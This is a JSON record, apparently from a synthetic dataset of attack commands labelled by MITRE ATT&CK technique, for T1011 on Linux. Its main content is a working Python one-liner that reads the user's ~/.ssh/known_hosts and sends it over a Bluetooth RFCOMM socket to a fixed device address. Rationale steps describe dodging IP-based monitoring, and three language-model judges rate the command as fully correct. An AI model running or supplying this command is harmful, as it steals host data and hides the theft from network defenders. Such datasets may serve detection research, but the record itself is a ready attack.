{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "explanation": "Exfiltrates user-accessible SSH host metadata over Bluetooth RFCOMM (an alternate network medium) rather than the primary IP channel, aligning with T1011.",
  "rationale_steps": [
    "Select Bluetooth RFCOMM as a non-IP medium per T1011.",
    "Open a user-level RFCOMM socket to a nonstandard channel (19).",
    "Read ~/.ssh/known_hosts and transmit bytes over RFCOMM.",
    "Close the socket to minimize observable artifacts in IP-based monitoring."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-71de9821",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The shell invocation and inline Python are properly quoted with balanced parentheses and valid Python socket constructs and separators.",
        "semantic_score": 5,
        "semantic_justification": "It reads ~/.ssh/known_hosts and transmits it over a Bluetooth RFCOMM socket to a target MAC/channel, achieving exfiltration over a non-IP medium consistent with T1011.",
        "combined_score": 5.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T00:22:22.269944Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting timeout, connecting to a Bluetooth device, reading a file, and sending data.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by establishing a Bluetooth RFCOMM connection to exfiltrate SSH known_hosts data over an alternative network medium, bypassing potential monitoring on the primary network.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T00:22:28.870041Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes and parentheses, valid function calls, and proper statement separators for single-line execution.",
        "semantic_score": 5,
        "semantic_justification": "The command precisely achieves its claimed intent by using `socket.AF_BLUETOOTH` and `BTPROTO_RFCOMM` to exfiltrate `~/.ssh/known_hosts` over a Bluetooth connection, directly aligning with MITRE ATT&CK T1011's description of using an 'other network medium' like Bluetooth.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T00:22:36.599963Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 5.0,
    "llm_average_score": 5.0,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}